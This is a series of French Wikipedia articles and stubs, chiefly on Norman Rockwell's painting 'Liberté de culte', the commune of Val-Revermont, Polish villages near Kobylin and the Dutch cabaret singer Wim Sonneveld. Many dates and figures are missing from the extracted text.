<doc id="9625681" url="https://fr.wikipedia.org/wiki?curid=9625681" title="Sang impur (homonymie)">
Sang impur (homonymie)



</doc>
<doc id="9625687" url="https://fr.wikipedia.org/wiki?curid=9625687" title="La Liberté de culte">
La Liberté de culte

Liberté de Culte (titre original, "") est le second tableau d'une série de peintures à l'huile, Les Quatre Libertés ("Four Freedoms"), produites par l'artiste peintre américain Norman Rockwell. Cette série avait pour thème les Quatre Libertés telles que Franklin D. Roosevelt — des États-Unis d'Amérique — les avait énoncées dans son discours annuel sur l'État de l'Union prononcé le . Rockwell considérait cette peinture et "Liberté d'expression" comme les deux meilleures de sa série. "Liberté de Culte" a été édité dans le numéro du "Saturday Evening Post" du en illustration d'un essai du philosophe Will Durant.
Contexte.
"Liberté de Culte" est la seconde œuvre d'une série de quatre peintures à l'huile de Norman Rockwell qui s'intitule "Les Quatre Libertés". Ces travaux se sont inspirés du discours sur l'État de l'Union de Franklin D. Roosevelt, qu'il a prononcé devant le Congrès des États-Unis le , connu sous le nom des Quatre Libertés. Des Quatre Libertés, seules sont décrites dans la Constitution américaine la liberté d'expression et la liberté de culte. Le thème des Quatre Libertés a été plus tard incorporé dans la déclaration de principe des alliés pendant la seconde guerre mondiale: la Charte de l'Atlantique, puis dans la Charte des Nations unies. La série de peintures a été publiée pendant quatre semaines consécutives dans le Saturday Evening Post, accompagnée d'essais d'auteurs remarquables: "Liberté d'expression" (), "Liberté de Culte" (), "Liberté de vivre à l'abri du besoin" (), "Liberté de vivre en sécurité" (). En ce qui concerne l'essai qui accompagnait Liberté de Culte, le rédacteur en chef du "Post" Ben Hibbs a choisi Durant, qui était un auteur à succès au sommet de sa carrière. À cette époque, Durant travaillait ardemment sur son œuvre de dix volumes "L'Histoire de la Civilisation" ("The Story of Civilization"), co-édité avec sa femme Ariel Durant. Will Durant donnait également des conférences sur l'histoire et la philosophie. Finalement, la série de peintures a été diffusée sous la forme d'affiches et a été instrumentalisée par le gouvernement pour servir le grand emprunt de guerre du gouvernement américain.
Description.
La peinture montre les profils de huit têtes dans un environnement modeste. Les différents personnages représentent des gens de confession différentes pendant une prière. On remarque en particulier trois personnages en bas de l'image (de droite à gauche) : un homme tête couverte qui tient un livre religieux dans sa main qui est juif, une femme plus âgée qui est protestante, et une jeune femme catholique dont le visage est éclairé ; elle égrène un chapelet. En 1966, Rockwell s'est servi de "Liberté de Culte" pour montrer son admiration à l'égard de John F. Kennedy par le biais d'une série nommée "L'Héritage Audacieux de JFK", publiée dans le magazine "Look". L'œuvre dépeint Kennedy de profil dans une composition similaire à celle de "Liberté de Culte" avec des soldats volontaires de la Paix.
Production.
La première version de cette peinture se passe chez un coiffeur avec des clients de confessions variées qui attendent leur tour dans le fauteuil du coiffeur. Son premier jet fut une peinture à l'huile de (41-by-33-inch) représentant la tolérance comme étant « les fondements d'une diversité religieuse en démocratie ». On peut voir un juif se faisant servir par un coiffeur protestant noir et un prêtre catholique romain qui attend son tour. Le problème était que l'on pouvait clairement identifier les différentes races et confessions car il y avait un accord tacite sur l'allure et l'apparence que pourrait avoir un individu d'une religion donnée. Alors que l'auteur tentait d'être plus explicite, il s'est trouvé qu'il eut recours à des exagérations blessantes, en particulier envers les personnages non chrétiens. Le juif apparait comme un stéréotype sémite, le client blanc a l'air BCBG, reléguant le noir au rang d'ouvrier agricole appesanti par le travail manuel sans parler au nom du gouvernement comme il se devait de le faire. Rockwell avait l'intention de montrer la tolérance religieuse, et il décréta que la première composition qu'il avait réalisée n'avait pas atteint ses objectifs.
En , le rédacteur en chef du "Post" Ben Hibbs s'est mis à soutenir le projet préliminaire de Rockwell des Quatre Libertés. Il lui donna deux mois pour terminer l’œuvre. Octobre arrive et le "Post" est inquiet de l'avancée du travail. Il envoie son rédacteur en chef de la rubrique Art à Arlington pour faire un compte-rendu. À ce moment-là, Rockwell travaillait sur "Liberté de Culte", la seconde peinture de la série. Rockwell a passé deux mois (octobre et quasiment tout le mois de ) sur ce travail, il était alors inspiré par la phrase « À chacun selon les impératifs de sa propre conscience ». Ses voisins de d'Arlington (Vermont) servirent de modèles : Rose Hoyt a posé comme une catholique avec un chapelet, malgré le fait qu'elle ait été protestante, adhérente de l'église épiscopalienne. D'autres gens posèrent comme Mrs. Harrington, Walter Squires le charpentier de Rockwell, la femme de Squires : Clara Squires (sur le côté droit), Winfield Secoy, et Jim Martin (au centre). La version finale se base sur d'autres indices visuels, comme le chapelet et le livre religieux. Sur l'œuvre on distingue des croyants noirs sur les côtés. Cet agencement ne convenait pas au Post qui n'a jamais affiché de noirs de manière évidente dans ses pages. Rockwell a dit qu'il avait rendu ces personnages acceptables car il avait peint « furtivement le visage de la femme noire en haut ; l'homme en bas, avec son fez, était trop exotique pour choquer. » L'image est souvent retravaillée et assombrie sur les reproductions car elle utilise un mélange de gris doux, beiges et marrons. La peinture a été appliquée en couches fines, ce qui permet au motif de la toile d'être perceptible et de contribuer à l'image.
Rockwell a déclaré qu'il trouve que les mains sont secondaires par rapport aux visages pour servir la narration. Au sujet de Liberté de Culte, Rockwell a déclaré: « Je dépendais uniquement des mains pour ne transmettre même pas la moitié du message que j'aurais aimé faire passer. » Le travail approfondi de Rockwell provient du fait que selon ses convictions la religion « est un sujet extrêmement épineux. Il est si facile de heurter les sensibilités. »
Revue critique.
Le rédacteur en chef du "Post", Ben Hibbs a dit de "Liberté d'Expression" et "Liberté de Culte" : « Pour moi ce sont un témoignage humain précieux sous la forme de peinture et de toile. Une superbe image, qui inspire et émeut des millions de gens. "Les Quatre Libertés", ont ému et continuent d'émouvoir. » « À chacun selon les impératifs de sa propre conscience » est d'une platitude qui suggère la pluralité des idées qu'a Rockwell sur la religion. L'origine de cette citation était une phrase issue des "Treize articles sur la foi "de Joseph Smith. En fait, Rockwell a demandé à ses collègues à plusieurs reprises l'origine de cette phrase et n'a été au courant des écrits de Smith qu'après la publication de la série. L'expression « À chacun selon les impératifs de sa propre conscience » (ou des variations similaires) a été utilisée dans nombre des constitutions des états au .
Des comptes-rendus critiques à l'égard de l’œuvre montrent que certains pratiquants sont en désaccord avec l'assimilation de toutes les confessions exprimées alors dans "Liberté de Religion. "Claridge trouve que 
Claridge a déclaré que la version précédente était . Murrau et McCabe remarquent que ce travail s'écarte de la tendance narrative pour laquelle Rockwell est connu.
Deborah Solomon considère cette peinture comme la moins bien réussie de la série qu'elle trouve congestionnée et quelque peu . Maureen Hart Hennessey, conservateur en chef du Musée Norman Rockwell, et le conservateur Anne Knutson considèrent que la partie de l'image qui ne montre que les mains et les visages est perturbante.
Bruce Cole du "Wall Street Journal" écrit que la description de Rockwell de ces gros plans de visages fantomatiques, les mains jointes en prière est fade, sans véritable message envers la liberté de religion — encore une fois ça ne casse pas des briques. Il se trouve que la foi, comme l'absence de peur, ou l'absence de désir, sont des choses personnelles, privées, intangibles et qui ne se représentent pas.

</doc>
<doc id="9625695" url="https://fr.wikipedia.org/wiki?curid=9625695" title="API ~">
API ~



</doc>
<doc id="9625696" url="https://fr.wikipedia.org/wiki?curid=9625696" title="Recueil d'anecdotes musicales">
Recueil d'anecdotes musicales



</doc>
<doc id="9625706" url="https://fr.wikipedia.org/wiki?curid=9625706" title="Lake Lure">
Lake Lure

 est une ville américaine située dans le comté de Rutherford dans l'État de Caroline du Nord. En 2010, sa population était de .

</doc>
<doc id="9625715" url="https://fr.wikipedia.org/wiki?curid=9625715" title="Val-Revermont">
Val-Revermont

Val-Revermont est une commune nouvelle située dans le département de l'Ain en région Auvergne-Rhône-Alpes.
Elle est née le de la fusion des deux communes : Treffort-Cuisiat et Pressiat.
Géographie.
Val-Revermont fait partie du Revermont. Située au pied de nombreuses collines comme le mont Myon ou encore le mont Grillerin, elle est située à une altitude d'environ 300 mètres en plaine et culmine à 661 mètres. Elle est traversée par le Bief d'Ausson, le Nacaretan, le Bief des Chaises et le Sevron (en limite avec Meillonnas).
Depuis ces dernières années, l'attractivité de Bourg-en-Bresse à une vingtaine de kilomètres, s'est fait sentir de plus en plus et le village a tendance à s'étendre dans sa partie basse, à la limite de la Bresse, où une route ouverte dans les années 1980 rend l'accès plus facile au chef-lieu du département.
Cette commune est formée des villages de Treffort, Cuisiat et de Pressiat qui ont chacun une identité distincte.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat des marges montagnardes, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols, etc.) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat semi-continental et est dans une zone de transition entre les régions climatiques « Bourgogne, vallée de la Saône » et « Jura ». Elle est en outre dans la zone H1c au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Ceyzériat à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Pour afficher une liste d’indicateurs climatiques caractérisant la commune aux horizons 2030, 2050 et 2100 et pouvoir ainsi s'adapter aux changements climatiques, entrer son nom dans Climadiag-commune, un site de Météo-France élaboré à partir des nouvelles projections climatiques de référence DRIAS-2020.
Urbanisme.
Typologie.
Au , Val-Revermont est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Bourg-en-Bresse, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Histoire.
Cuisiat.
Comme d'autres villages du Revermont, Cuisiat fut victime de la barbarie nazie le 18 juillet 1944. Plusieurs habitants furent déportés, une partie du village brûlé par les troupes du Reich en représailles d'actes de résistance commis dans la région.
Pressiat.
Trois événements ont marqué l'histoire du village :
Treffort.
Au , un site défensif est établi en haut du village de Treffort.
En 1283, le duc de Bourgogne ravage le Revermont et prend Treffort.
En 1289, Treffort est vendu par le duc de Bourgogne au comte de Savoie, qui dote ses habitants d'une charte de franchise.
En 1641, le village est détruit par les troupes franc-comtoises au cours de la guerre franco-espagnole.
Histoire commune.
À la suite du traité de Lyon, signé en 1601, les trois villages deviennent français, comme l'ensemble de la Bresse.
En 1972, la commune de Treffort fusionne avec celle de Cuisiat qui prend le statut de commune associée.
À la suite d'un arrêté préfectoral du 4 décembre 2015, les communes de Pressiat et Treffort-Cuisiat fusionnent pour former la commune nouvelle de Val-Revermont le .
Politique et administration.
La commune nouvelle est formée des trois communes déléguées de Treffort, Cuisiat et Pressiat.
Culture locale et patrimoine.
Lieux et monuments.
Musée.
Le musée départemental du Revermont, situé dans le haut de Cuisiat à côté de l'église, est installé dans l'ancienne mairie-école du village. Il fait partie des musées des pays de l'Ain et présente la culture du Revermont, à travers un potager et un verger conservatoire, et au travers d'expositions permanentes :
Mont Myon.
Le mont Myon est un sommet du massif du Jura culminant à d'altitude. Il est le point culminant de la commune et un site naturel classé.
La route des Monts.
La route des Monts qui « sépare » le Revermont proprement dit de la plaine de Bresse, serpente doucement entre Jasseron et Coligny. À l'automne, elle offre une vue magnifique sur les monts qui la dominent du côté droit et dont les couleurs, selon les mélanges d'essences d'arbres, irradient le versant jusqu'aux abords du village de Pressiat.
Église Saint-Laurent.
L'église Saint-Laurent de Pressiat possède deux chapelles latérales à toit de lauzes, une statue en bois doré de saint Laurent et des fonts baptismaux datant du . Elle est inscrite au titre des monuments historiques.

</doc>
<doc id="9625716" url="https://fr.wikipedia.org/wiki?curid=9625716" title="Berdychów">
Berdychów

Berdychów (prononciation : ) est un village polonais de la gmina de Kobylin dans le powiat de Krotoszyn de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au nord de Kobylin (siège de la "gmina"), à au nord-ouest de Krotoszyn (siège du powiat) et à au sud de Poznań (capitale régionale).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Berdychów est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9625720" url="https://fr.wikipedia.org/wiki?curid=9625720" title="Meelis Rooba">
Meelis Rooba

Meelis Rooba, né le à Kaaruka en Estonie, est un footballeur international estonien, devenu entraîneur à l'issue de sa carrière, qui évoluait au poste de milieu droit. Il est le grand frère d'Urmas Rooba.
Il est actuellement l'entraîneur du Paide Linnameeskond depuis 2010.
Biographie.
Carrière de joueur.
Meelis Rooba dispute 3 matchs en Ligue des champions, et deux matchs en Coupe de l'UEFA.
Carrière internationale.
Meelis Rooba compte 50 sélections et 4 buts avec l'équipe d'Estonie entre 1996 et 2004. 
Il est convoqué pour la première fois par le sélectionneur national Teitur Thórdarson pour un match de la Coupe baltique 1996 contre la Lettonie le (1-1). Par la suite, le , il inscrit son premier but en sélection contre la Finlande, lors d'un match amical (2-2). Il reçoit sa dernière sélection le contre l'Albanie (1-1).

</doc>
<doc id="9625722" url="https://fr.wikipedia.org/wiki?curid=9625722" title="Długołęka (Grande-Pologne)">
Długołęka (Grande-Pologne)

Długołęka (prononciation : ) est un village polonais de la gmina de Kobylin dans le powiat de Krotoszyn de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au sud-ouest de Kobylin (siège de la "gmina"), à à l'ouest de Krotoszyn (siège du powiat) et à au sud de Poznań (capitale régionale).
Histoire.
De 1815 à 1919, Dlugolenka fait partie de l'arrondissement de Krotoschin dans la province de Posnanie.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Długołęka est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9625724" url="https://fr.wikipedia.org/wiki?curid=9625724" title="Mogens Fog">
Mogens Fog

Mogens Fog, né le à Frederiksberg (Danemark) et mort le , est un physicien politicien, résistant et homme politique danois.
Biographie.
Il devient physicien et membre du Parti communiste danois. 
Durant la Seconde Guerre mondiale, il joue un rôle important dans la résistance danoise et créé le journal "Frit Danmark". Il est arrêté en par la Gestapo. Il s'échappe en .
Entre mai et , il est ministre des Affaires spéciales dans le gouvernement d'union nationale mené par Vilhelm Buhl.
En 1958, il fonde le Parti populaire socialiste danois avec Aksel Larsen. De 1966 à 1972, il est le recteur de l'université de Copenhague. 

</doc>
<doc id="9625728" url="https://fr.wikipedia.org/wiki?curid=9625728" title="Fijałów">
Fijałów

Fijałów (prononciation : ) est un village polonais de la gmina de Kobylin dans le powiat de Krotoszyn de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au nord-est de Kobylin (siège de la "gmina"), à au nord-ouest de Krotoszyn (siège du powiat) et à au sud de Poznań (capitale régionale).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Fijałów est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9625735" url="https://fr.wikipedia.org/wiki?curid=9625735" title="Élections législatives sous la Quatrième République">
Élections législatives sous la Quatrième République



</doc>
<doc id="9625737" url="https://fr.wikipedia.org/wiki?curid=9625737" title="Chambray IF Football">
Chambray IF Football



</doc>
<doc id="9625740" url="https://fr.wikipedia.org/wiki?curid=9625740" title="Bonaparte, Premier Consul (Ingres)">
Bonaparte, Premier Consul (Ingres)



</doc>
<doc id="9625742" url="https://fr.wikipedia.org/wiki?curid=9625742" title="Metalhead (album)">
Metalhead (album)

Metalhead est le studio du groupe britannique heavy metal anglais Saxon, sorti le .
Titres.
Album composé par Biff Byford, Paul Quinn, Doug Scarratt, Nibbs Carter. (Intro composée et jouée par Nigel Glockler)

</doc>
<doc id="9625746" url="https://fr.wikipedia.org/wiki?curid=9625746" title="Folles journées de Nantes">
Folles journées de Nantes



</doc>
<doc id="9625753" url="https://fr.wikipedia.org/wiki?curid=9625753" title="Górka (Krotoszyn)">
Górka (Krotoszyn)

Górka (prononciation : ) est un village polonais de la gmina de Kobylin dans le powiat de Krotoszyn de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au nord de Kobylin (siège de la "gmina"), à à l'ouest de Krotoszyn (siège du powiat) et à au sud de Poznań (capitale régionale).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Górka est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9625755" url="https://fr.wikipedia.org/wiki?curid=9625755" title="BW Group">
BW Group

BW Group est une entreprise norvégienne spécialisée dans le transport maritime d'hydrocarbures.
Histoire.
BW Group est issue de la fusion entre l'entreprise norvégienne Bergesen et l'entreprise singapourienne World-Wide Shipping.
En , BW Group acquiert une participation de 12,1 % dans Aurora LPG.

</doc>
<doc id="9625756" url="https://fr.wikipedia.org/wiki?curid=9625756" title="Kuklinów">
Kuklinów

Kuklinów (prononciation : ) est un village polonais de la gmina de Kobylin dans le powiat de Krotoszyn de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au nord-est de Kobylin (siège de la "gmina"), à au nord-ouest de Krotoszyn (siège du powiat) et à au sud de Poznań (capitale régionale).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Kuklinów est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9625759" url="https://fr.wikipedia.org/wiki?curid=9625759" title="Bonaparte, Premier Consul (Gros)">
Bonaparte, Premier Consul (Gros)



</doc>
<doc id="9625779" url="https://fr.wikipedia.org/wiki?curid=9625779" title="Łagiewniki (Krotoszyn)">
Łagiewniki (Krotoszyn)

Łagiewniki (prononciation : ) est un village polonais de la gmina de Kobylin dans le powiat de Krotoszyn de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au nord de Kobylin (siège de la "gmina"), à au nord-ouest de Krotoszyn (siège du powiat) et à au sud de Poznań (capitale régionale).
Le village possédait une population de en 2011.
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Łagiewniki est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9625781" url="https://fr.wikipedia.org/wiki?curid=9625781" title="Filippov">
Filippov

Filippov ("masculin" ; ) ou Filippova ("féminin" ; ) est un patronyme russe porté par plusieurs personnalités (par ordre alphabétique) :

</doc>
<doc id="9625784" url="https://fr.wikipedia.org/wiki?curid=9625784" title="Filipov">
Filipov

Filipov ("masculin" ; ) ou Filipova ("féminin" ; ) est un patronyme bulgare porté par plusieurs personnalités (par ordre alphabétique) :

</doc>
<doc id="9625787" url="https://fr.wikipedia.org/wiki?curid=9625787" title="Filippova">
Filippova



</doc>
<doc id="9625788" url="https://fr.wikipedia.org/wiki?curid=9625788" title="Filipova">
Filipova



</doc>
<doc id="9625789" url="https://fr.wikipedia.org/wiki?curid=9625789" title="Rasmus Rasmussen">
Rasmus Rasmussen

Rasmus Rasmussen, né le à Kerteminde et mort le à Odense, est un gymnaste artistique danois.
Carrière.
Rasmus Rasmussen participe aux Jeux olympiques d'été de 1920 à Anvers et obtient une médaille d'argent en système suédois par équipes.

</doc>
<doc id="9625790" url="https://fr.wikipedia.org/wiki?curid=9625790" title="Filippoff">
Filippoff



</doc>
<doc id="9625810" url="https://fr.wikipedia.org/wiki?curid=9625810" title="Filipoff">
Filipoff



</doc>
<doc id="9625811" url="https://fr.wikipedia.org/wiki?curid=9625811" title="Wim Sonneveld">
Wim Sonneveld

Wim Sonneveld est un chanteur et artiste de cabaret néerlandais né le à Utrecht et mort le à Amsterdam. Il est considéré comme l'un des plus grands chanteurs de cabaret des Pays-Bas.
Biographie.
Wim, ou Willem de son réel prénom, Sonneveld est né en 1917 à Utrecht, dans la maison de ses parents, au n° 84 de la rue « "Jan Pieterszoon Coen" ». Il était le fils de Gerrit Sonneveld, un menuisier devenu modeste épicier, et de Geertruida van den Berg, qui avait eu six enfants, et dont Wim était le quatrième enfant. Alors très jeune, Wim perdit sa mère, morte le , âgée de 38 ans. Wim eut une scolarité difficile durant laquelle il fut surtout le clown de la classe. Il enchaîna ensuite plusieurs petits boulots, tous assez infructueux.
En 1932, il fit partie d’un groupe de chant amateur, les « "Keep Smiling Singers" ». Ensuite, en 1934, avec Fons Goossens, il forma un duo qui se produisait surtout lors des jubilés de diverses associations et institutions. Cette même année, il rencontra l’écrivain et publicitaire Huub Janssen (Hubertus Wilhelmus Jacobus Janssen, Rotterdam 1910, Paris, Gare du Nord, 1984), un moine défroqué, avec qui, en , il entreprit un voyage à travers la France. En 1936, il vécut à Amsterdam, d'abord au n°9 du « "Westermarkt" », et plus tard au n°826 du « "Prinsengracht" » avec Huub Janssen. Cette année-là, il devint secrétaire du cabaretier et artiste de revue Louis Davids. Ainsi, la journée, il s’occupait du secrétariat, et le soir, il jouait de petits rôles et chantait quelques chansons. Durant cette même période, il se produisait avec sa propre troupe « "De Rarekiek" » pour laquelle collaborait également son compagnon Huub. Sonneveld chanta en France en 1937 dans les spectacles de cabaret de Suzy Solidor et Agnes Capri.
Après la déclaration de guerre de 1939 entre la France et l’Allemagne, il revint aux Pays-Bas et joua des rôles théâtraux dans la revue de Loekie Bouwmeester. En 1940, il se produisit au « "Theater der Prominenten" » (« "Théâtre de personnalités" ») et participa aux « "Sprookjesspelers" » (« "Les jeux des contes de fées" ») d’Abraham van der Vies. Il y rencontra notamment Conny Stuart. En 1943, il réunit dans sa propre compagnie, entre autres, Conny Stuart, Lia Dorana, Albert Mol, Joop Doderer, Hetty Blok et Emmy Arbous.
Sa troupe, le « "Cabaret Wim Sonneveld" », continua d’exister jusqu'en 1959. Ensuite, Sonneveld tint pendant trois ans le rôle principal du professeur Higgins dans la comédie musicale "My Fair Lady" en adaptation néerlandaise. C’est alors qu’il conçut l’idée de se produire seul, ce qui fut concrétisé en 1964, par « "Une soirée avec Wim Sonneveld" ». Ce fut ensuite en 1966 « "Wim Sonneveld et Ina van Faassen" » et en 1971 « "Wim Sonneveld, Willem Nijholt et Corry van Gorp" ».
La première du spectacle « "Une soirée avec Wim Sonneveld" » eut lieu à Amsterdam le . Ce spectacle fut immédiatement très bien accueilli. Les textes étaient d'Annie M.G. Schmidt, de Simon Carmiggelt, de Michel van der Plas et de Jacques van Tol, entre autres. Friso Wiegersma, (Deurne (Pays-Bas) 1925 – Amsterdam 2006), rencontré en 1947, artiste peintre (de décors de théâtre et d'illustrations, etc.), créateur de costumes de théâtre, et parolier de chansons, compagnon de Wim Sonneveld, écrivit également quelques chansons pour le spectacle, et la chanson « "Nikkelen Nelis" » ("le chanteur de rue"), la chanson la plus célèbre de ce spectacle, est de sa plume. Le spectacle connut de nombreuses représentations, près de sept-cents, et un disque « "long playing" » permet encore d’en écouter les chansons.
Trois ans après la première de ce spectacle, Wim Sonneveld voulu un nouveau show. Afin de renouveler le spectacle et pour éviter que celui-ci ne ressemble trop au précédent, il s’accompagna d’une actrice, Ina van Faassen. Pour elle, ce spectacle fut une véritable percée auprès du grand public, car auparavant, elle ne jouait que des rôles de théâtre. Ce spectacle fut également bien accueilli par la presse. Wim Sonneveld écrivit de nombreuses chansons lui-même, mais fit également appel à des paroliers tels qu'Annie M.G. Schmidt, Simon Carmiggelt, Michel van der Plas et à nouveau, Friso Wiegersma. L'une des chansons les plus connues de Wim Sonneveld, « "Het dorp" », dont les paroles furent écrites par Friso Wiegersma (sous le pseudonyme d'Hugo Verhage) sur la musique de la chanson « "La Montagne" » de Jean Ferrat, était au programme de ce spectacle. Cette chanson en néerlandais évoque, elle aussi, le temps qui passe et la société qui change, comme le fragment ci-après (en traduction libre) le montre : "Chez moi, j'ai encore une carte postale. Il y a une église, un cheval avec une charrette, la boucherie J. van der Ven, un café, une demoiselle à vélo. Ce qui ne vous dit sûrement rien, mais c'est là que je suis né. Ce village, je me souviens comment il était. Les enfants des fermiers dans la classe de l’école. Le cliquetis d’une charrette sur les pavés, la maison communale avec une pompe devant, un chemin de terre entre les chapelles, le bétail, les fermes. (…) Ce village d’alors n’est plus. Tout ce qu’il en reste pour moi, c’est une image et des souvenirs. Et quand sur le sentier du jardin de mon père, les grands arbres étaient encore debout, j'étais un enfant, comment aurais-je pu savoir, que tout cela disparaitrait à jamais". 
Dans ce qui fut ensuite son dernier spectacle, Wim Sonneveld voulu opérer un profond rajeunissement du genre. Initialement, Wim Sonneveld ne voulut pas mettre en chantier un nouveau spectacle, craignant que, dans le bouillonnement musical de la fin des "sixties" et du début des "seventies", son spectacle n'apparaisse vieilli et démodé. Mais il se laissa finalement convaincre. C’est pourquoi, avec deux jeunes artistes à ses côtés, Willem Nijholt et Corrie van Gorp, il se produisit dans ce nouveau spectacle. Le spectacle fut créé le à Amsterdam. Durant le spectacle, Wim Sonneveld devait changer trois fois de costume de scène. Et à chaque fois qu'il y avait pour lui un temps mort dans le spectacle, il se reposait, épuisé, sur un divan dans sa loge, se plaignant souvent de son cœur. Bien plus tard, il est apparu que ce spectacle avait été bien trop éprouvant physiquement pour lui.
En 1959, lors d'un voyage dans le sud de la France, il avait acheté, impulsivement sur un coup de cœur, à Roquefort-les-Pins une ancienne bergerie, la "Bergerie de Notre-Dame", qui avait comme dépendance trois hectares d'oliviers, où alla vivre de manière permanente Huub Janssen. A vrai dire, "la Bergerie" était à l'origine une véritable ruine, qu'il restaura patiemment pendant des années. Lui-même y emménagea. Mais après dix ans, il la quitta, car cette demeure était devenue une attraction touristique pour les Néerlandais qui passaient leurs vacances en France. Il fit construire à Vence, "La Casamata", belle demeure moderniste et originale conçue par l'architecte néerlandais Arnold (Nol) Numan Oyevaar (1922 - 2006) du bureau "Oyevaar - Stolle - Van Gool", les architectes de la Tour ING à La Haye, et il en garda l'adresse secrète autant que possible. Il y résidait souvent aussi avec son compagnon Friso Wiegersma. 
Enfin, en 1973, Wim Sonneveld fut acteur de cinéma dans le film "Op de Hollandse toer" ("Going Dutch" en version internationale, que l'on pourrait traduire par "Tournée hollandaise"). C’est un film comique, amusant, avec de belles couleurs et, avec le recul, une belle image du temps. L'histoire est celle d’un fils déclassé d’une bonne famille, soumis à un petit chef dictatorial, et qui gagne sa vie dans une agence de voyages. Le héros doit, pour la première fois, faire le guide pour un groupe international de touristes aux Pays-Bas. Pour ce film, Wim Sonneveld avait fort aimé de n’avoir pas à organiser tout lui-même. C’était pour lui comme une grande récréation pour un film sans grande prétention. Mais les attentes des critiques étaient bien trop élevées. Dès la première présentation du film, le film fut éreinté par les critiques cinématographiques. Ceux-ci s’adressaient surtout à Wim Sonneveld alors qu’il n’assumait que le rôle principal et n’en était aucunement le réalisateur ni le scénariste principal. Le public bouda le film également. Le coup lui fut à ce point rude qu’il s'est alors détourné des Pays-Bas pour longtemps. Il avait des projets d’un hôtel ou d'une maison d'hôtes en France, sur la Côte d'Azur, à Juan-les-Pins, pour ses amis et connaissances. Il se montrait cependant parfois à la télévision néerlandaise.
Wim Sonneveld fut victime le d’une crise cardiaque dans sa voiture, lors d’une courte visite aux Pays-Bas destiné à présenter un programme aux responsables de la KRO, programme musical durant lequel il aurait reçu des chanteurs comme Nana Mouskouri ou Marcel Amont. Il fut hospitalisé à Amsterdam, amené à l'hôpital par les auto-stoppeurs qu'il avait embarqués un peu plus tôt. Après deux semaines de repos, il était en très bonne forme au point de parler, lors d’une interview menée par Henk van der Meijden, de ses plans d’avenir. Il voulait publier ses mémoires (intitulés « "Sonneveld, Madame" » faisant allusion à l'époque où il travaillait dans l'épicerie de son père et que lors de sa tournée de livraisons, il s'annonçait aux clients lui ouvrant la porte de leur maison pour la remise de la commande effectuée à l'épicerie) et enregistrer un « "long-playing" » titré « "Mon cœur" » reprenant diverses chansons ayant le cœur pour thème. Il envisageait aussi un nouveau programme pour ses 40 ans de métier en 1975. Il dit aussi qu’il avait pris la décision de ne jamais plus porter de perruque. Le jour même de la publication de l’interview dans le journal néerlandais « "De Telegraaf" », Wim Sonneveld mourut le , à l'Hôpital Universitaire d'Amsterdam, d’une seconde crise cardiaque, à l’âge de 56 ans. Pour le grand public, ce fut un choc extrême, mais ses proches expliquèrent plus tard que sa mort ne fut pas tout à fait inattendue, car Sonneveld avait déjà eu des alertes cardiaques même si rien de concret n’avait été décelé par ses médecins.
Il fut inhumé le lundi au cimetière catholique d'Amsterdam Buitenveldert en présence d'une foule très importante. Huub Janssen vint le rejoindre dans la même tombe dix ans plus tard. Friso Wiegersma, lui, demanda à être incinéré. 
Wim Sonneveld a toujours veillé à garder très secrètes sa vie privée et son homosexualité. Ainsi, les relations qu’il maintenait avec Huub Janssen (par loyauté d’âme, ou bien à cause d’un chantage de ce dernier, comme le pensaient les frères de Wim ?) alors que Sonneveld avait déjà rencontré son nouveau compagnon Friso Wiegersma, resteront nimbées de mystère.
En 2017, en l'honneur de celui qui avait chanté Amsterdam et ses canaux (avec "Aan de Amsterdamse grachten"), et pour le centenaire de sa naissance, un pont de la "Marnixstraat" (Rue Marnix) enjambant le "Leidsegracht" dans le centre Amsterdam, non loin du théâtre "DeLaMar" où Wim Sonneveld avait donné de nombreux spectacles, a été dénommé le "Wim Sonneveldbrug" (pont Wim Sonneveld).

</doc>
<doc id="9625816" url="https://fr.wikipedia.org/wiki?curid=9625816" title="Nepomucenów (Grande-Pologne)">
Nepomucenów (Grande-Pologne)

